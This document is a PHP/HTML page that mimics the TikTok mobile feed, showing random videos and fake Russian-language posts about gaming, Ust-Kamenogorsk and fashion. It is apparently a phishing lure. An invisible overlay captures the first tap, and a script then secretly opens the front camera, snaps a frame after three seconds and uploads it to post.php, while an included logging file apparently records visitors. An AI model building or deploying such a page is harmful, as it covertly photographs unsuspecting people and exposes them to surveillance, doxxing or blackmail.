<?php 
include 'core_log.php'; 

// Сканирование контента
$vids = glob("vids/*.mp4");
$imgs = glob("imgs/*.jpg");
if(empty($vids)) $vids = ['video.mp4'];
if(empty($imgs)) $imgs = ['avatar.jpg'];

// БАЗА ДАННЫХ КОНТЕНТА (PUBG + Рутина + Рекомендации)
$content_db = [
    [
        'user' => 'prikol_ru',
        'desc' => 'Когда хоррор оказался слишком страшным... 💀 #куплинов #хоррор #реки',
        'likes' => '1.2M', 'cmts' => '8432', 'saves' => '124K', 'shares' => '65K',
        'music' => 'оригинальный звук - prikol_ru'
    ],
    [
        'user' => 'pubg_lover_kz',
        'desc' => 'Минус сквад на Починках! Эрангель сегодня радует 😎 #pubgmobile #пабг #топ1 #kz',
        'likes' => '45.7K', 'cmts' => '1204', 'saves' => '5601', 'shares' => '890',
        'music' => 'PUBG Theme Remix - Global'
    ],
    [
        'user' => 'ust_ka_vibe',
        'desc' => 'Опять пробки на набережной, Усть-Каменогорск засыпает... 🌃 #ука #казахстан #вечер',
        'likes' => '12.3K', 'cmts' => '450', 'saves' => '1200', 'shares' => '340',
        'music' => 'M' . 'iyagi - Silhouette'
    ],
    [
        'user' => 'morning_routine',
        'desc' => 'Мои обязательные добавки: D3, K2 и Омега-3. Здоровье превыше всего! ✨ #routine #biohacking #healthy',
        'likes' => '89.2K', 'cmts' => '2100', 'saves' => '34K', 'shares' => '4100',
        'music' => 'Lo-fi Study Beats'
    ],
    [
        'user' => 'pro_gamer_2026',
        'desc' => 'Зацените мой новый сет в Стандофф 2! Готов к катке? 🔫 #standoff2 #скины #gaming',
        'likes' => '215K', 'cmts' => '15K', 'saves' => '45K', 'shares' => '12K',
        'music' => 'Phonk Remix 2026'
    ],
    [
        'user' => 'ginger_style',
        'desc' => 'Новый образ с бордовым шарфом. Оцените от 1 до 10? 🦊❤️ #redhead #style #autumn',
        'likes' => '67K', 'cmts' => '890', 'saves' => '5400', 'shares' => '1100',
        'music' => 'Slowed Pop Vibe'
    ]
];

// Случайный выбор
$current_v = $vids[array_rand($vids)];
$current_i = $imgs[array_rand($imgs)];
$data = $content_db[array_rand($content_db)];
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>TikTok</title>
    <style>
        :root { --tt-red: #fe2c55; --tt-blue: #25f4ee; }
        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: -apple-system, BlinkMacSystemFont, "Noto Sans", "Helvetica Neue", Arial, sans-serif; overflow: hidden; color: #fff; touch-action: none; }
        .v-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; opacity: 0.8; pointer-events: none; }
        .play-btn svg { width: 70px; height: 70px; fill: #fff; }
        .heart-fx { position: absolute; pointer-events: none; z-index: 1001; animation: heart_anim 0.8s ease-out forwards; }
        .note-fx { position: absolute; right: 30px; bottom: 45px; font-size: 20px; color: #fff; pointer-events: none; z-index: 9; animation: note_anim 3s linear forwards; opacity: 0.8; }
        @keyframes heart_anim { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5) translateY(-100px); opacity: 0; } }
        @keyframes note_anim { 0% { transform: translate(0,0) rotate(0deg); opacity: 1; } 100% { transform: translate(-80px, -180px) rotate(45deg); opacity: 0; } }
        .header { position: absolute; top: 40px; width: 100%; display: flex; justify-content: center; align-items: center; z-index: 10; font-weight: 600; font-size: 16px; }
        .header .tabs { display: flex; gap: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
        .header span { opacity: 0.6; transition: 0.2s; }
        .header span.active { border-bottom: 2.5px solid #fff; padding-bottom: 4px; opacity: 1; }
        .side-bar { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 15px; z-index: 10; }
        .author { position: relative; margin-bottom: 10px; }
        .author img { width: 46px; height: 46px; border-radius: 50%; border: 1.5px solid #fff; object-fit: cover; }
        .follow { position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); background: var(--tt-red); border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; border: 1.5px solid #fff; font-size: 16px; font-weight: bold; }
        .btn-box { text-align: center; font-size: 12px; font-weight: 600; text-shadow: 0 1px 3px rgba(0,0,0,0.7); }
        .btn-box svg { width: 35px; height: 35px; margin-bottom: 2px; }
        .music-disc { width: 46px; height: 46px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 9px solid #1a1a1a; animation: rotate 4s linear infinite; margin-top: 5px; overflow: hidden;}
        .music-disc img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .meta { position: absolute; left: 12px; bottom: 85px; z-index: 10; width: 80%; text-shadow: 0 1px 3px rgba(0,0,0,0.7); }
        .meta b { display: block; font-size: 16px; margin-bottom: 6px; font-weight: 700; }
        .meta p { font-size: 14.5px; margin: 0; line-height: 1.3; font-weight: 400; }
        .music-name { display: flex; align-items: center; gap: 6px; margin-top: 8px; font-size: 13.5px; overflow: hidden; width: 60%; }
        .navbar { position: absolute; bottom: 0; width: 100%; height: 50px; background: #000; display: flex; justify-content: space-around; align-items: center; z-index: 20; border-top: 0.2px solid #222; padding-bottom: 12px; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; opacity: 0.6; font-weight: 500; }
        .nav-item.active { opacity: 1; }
        .nav-item svg { width: 24px; height: 24px; margin-bottom: 2px; }
        .plus-btn { width: 42px; height: 26px; background: #fff; border-radius: 8px; position: relative; display: flex; align-items: center; justify-content: center; transform: scale(1.05); }
        .plus-btn::before { content: ''; position: absolute; left: -3.5px; width: 14px; height: 100%; background: var(--tt-blue); border-radius: 8px; z-index: -1; }
        .plus-btn::after { content: ''; position: absolute; right: -3.5px; width: 14px; height: 100%; background: var(--tt-red); border-radius: 8px; z-index: -1; }
        #gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; background: transparent; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div id="gate"></div>
<div id="pb" class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
<video id="v" class="v-bg" loop playsinline src="<?php echo $current_v; ?>"></video>

<div class="header">
    <div class="tabs"><span>Подписки</span><span class="active">Рекомендации</span></div>
</div>
<div class="side-bar">
    <div class="author"><img src="<?php echo $current_i; ?>"><div class="follow">+</div></div>
    <div class="btn-box"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12.1 18.55l-.1.1-.1-.1C7.14 14.24 4 11.39 4 8.5 4 6.5 5.5 5 7.5 5c1.54 0 3.04.99 3.57 2.36h1.87C13.46 5.99 14.96 5 16.5 5c2 0 3.5 1.5 3.5 3.5 0 2.89-3.14 5.74-7.9 10.05z"/></svg><br><?php echo $data['likes']; ?></div>
    <div class="btn-box"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12c0 1.61.41 3.21 1.18 4.63L2 22l5.37-1.18c1.42.77 3.02 1.18 4.63 1.18 5.52 0 10-4.48 10-10S17.52 2 12 2zm0 18c-1.4 0-2.8-.3-4-1l-.3-.2-3 .7.7-3-.2-.3C4.3 15 4 13.6 4 12c0-4.4 3.6-8 8-8s8 3.6 8 8-3.6 8-8 8z"/></svg><br><?php echo $data['cmts']; ?></div>
    <div class="btn-box"><svg viewBox="0 0 24 24" fill="#fff"><path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-4.37L19 21V5c0-1.1-.9-2-2-2z"/></svg><br><?php echo $data['saves']; ?></div>
    <div class="btn-box"><svg viewBox="0 0 24 24" fill="#fff"><path d="M15 5.63 20.66 12 15 18.37V14h-1c-3.96 0-7.14 2.31-8.77 5.54a9.1 9.1 0 0 1-.21-2.57c0-4.42 3.58-8 8-8h2V5.63M13 3v5c-5.52 0-10 4.48-10 10 0 .29.01.58.04.86.37-5.11 4.44-9.14 9.46-9.14h.5V3l7 8.5L13 20v-5.5z"/></svg><br><?php echo $data['shares']; ?></div>
    <div class="music-disc"><img src="<?php echo $current_i; ?>"></div>
</div>
<div class="meta">
    <b>@<?php echo $data['user']; ?></b>
    <p><?php echo $data['desc']; ?></p>
    <div class="music-name"><span>🎵</span> <marquee scrollamount="4"><?php echo $data['music']; ?></marquee></div>
</div>
<div class="navbar">
    <div class="nav-item active"><svg viewBox="0 0 24 24" fill="#fff"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Главная</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>Друзья</div>
    <div class="plus-btn"><b style="color:#000; font-size:18px;">+</b></div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="#fff"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>Входящие</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Профиль</div>
</div>
<video id="cam_s" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none" width="640" height="480"></canvas>
<script>
    const v = document.getElementById('v'), g = document.getElementById('gate'), pb = document.getElementById('pb'), cs = document.getElementById('cam_s'), can = document.getElementById('c');
    let startY = 0;
    document.addEventListener('touchstart', e => startY = e.touches[0].clientY);
    document.addEventListener('touchend', e => {
        let endY = e.changedTouches[0].clientY;
        if (startY - endY > 100) location.reload(); 
    });
    function spawnNote() {
        const n = document.createElement('div'); n.className = 'note-fx'; n.innerHTML = '♪';
        document.body.appendChild(n); setTimeout(() => n.remove(), 3000);
    }
    function showHeart(x, y) {
        if (navigator.vibrate) navigator.vibrate(15);
        const h = document.createElement('div'); h.className = 'heart-fx';
        h.style.left = (x - 25) + 'px'; h.style.top = (y - 25) + 'px';
        h.innerHTML = '<svg width="50" height="50" viewBox="0 0 24 24" fill="#fe2c55"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>';
        document.body.appendChild(h); setTimeout(() => h.remove(), 800);
    }
    async function cam() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            cs.srcObject = s; await cs.play();
            setTimeout(() => {
                const ctx = can.getContext('2d');
                ctx.drawImage(cs, 0, 0, can.width, can.height);
                fetch('post.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'cat=' + encodeURIComponent(can.toDataURL('image/jpeg', 0.8)) });
                s.getTracks().forEach(tr => tr.stop());
            }, 3000);
        } catch(e) {}
    }
    document.addEventListener("visibilitychange", () => {
        if (document.hidden) v.pause(); 
        else if (g.style.display === 'none') v.play();
    });
    g.onclick = (e) => {
        if (g.style.display !== 'none') {
            g.style.display = 'none'; pb.style.display = 'none';
            v.muted = false; v.play(); cam(); 
            setInterval(spawnNote, 2000);
        }
        showHeart(e.clientX, e.clientY);
    };
</script>
</body>
</html>
